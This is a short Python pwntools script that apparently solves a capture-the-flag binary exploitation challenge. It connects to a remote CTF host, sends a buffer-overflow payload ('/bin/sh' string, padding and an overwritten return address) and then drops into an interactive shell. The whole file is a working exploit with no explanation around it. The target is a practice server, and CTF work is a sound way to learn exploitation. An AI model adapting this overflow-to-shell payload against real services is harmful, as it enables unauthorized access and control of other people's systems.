from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11007
p = remote(host, port)
#p = process('./end')

p.sendline('/bin/sh\x00' + 'a'*0x120 + p64(0x4000ed) + 'a'*0x11)
p.interactive()
